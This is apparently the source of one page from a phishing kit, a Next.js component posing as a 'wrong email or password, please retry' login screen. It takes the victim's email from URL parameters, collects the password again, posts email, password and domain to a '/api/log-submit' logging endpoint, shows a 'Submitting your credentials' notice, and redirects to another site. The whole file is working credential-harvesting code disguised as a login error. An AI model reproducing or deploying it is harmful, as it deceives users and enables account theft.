'use client'

import '../styles/globals.css'
import { useSearchParams, useRouter } from 'next/navigation'
import { useState } from 'react'

export default function EndPage() {
  const params = useSearchParams()
  const router = useRouter()
  const email = params.get('email') || ''
  const domain = params.get('domain') || ''

  const [password, setPassword] = useState('')
  const [errors, setErrors] = useState({ password: '' })
  const [showModal, setShowModal] = useState(false)

  const handleRetry = async (e: React.FormEvent) => {
    e.preventDefault()
    if (password.length < 5) {
      setErrors({ password: 'Minimum 5 characters' })
      return
    }
    setShowModal(true)
    await fetch('/api/log-submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, domain }),
    })
    setTimeout(() => {
      // Redirect to finaltest.com
      router.push('https://finaltest.com')
    }, 2000)
  }

  return (
    <div className="login-container relative">
      <div className="login-card">
        <h1 className="text-2xl font-bold text-center mb-2 text-red-600">
          Wrong email or password. Please retry.
        </h1>
        <p className="text-center mb-4 text-gray-700">{email}</p>
        <form onSubmit={handleRetry} className="space-y-4">
          <input
            type="password"
            placeholder="Enter your password"
            value={password}
            onChange={e => {
              setPassword(e.target.value)
              if (errors.password && e.target.value.length >= 5) {
                setErrors({ password: '' })
              }
            }}
            className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-400"
            required
          />
          {errors.password && (
            <p className="text-sm text-red-600">{errors.password}</p>
          )}
          <button
            type="submit"
            className="w-full bg-red-500 text-white py-3 rounded-lg hover:bg-red-600 transition"
          >
            Retry
          </button>
        </form>
      </div>

      {showModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <h2 className="text-lg font-semibold text-gray-800">Please wait…</h2>
            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
          </div>
        </div>
      )}
    </div>
  )
}
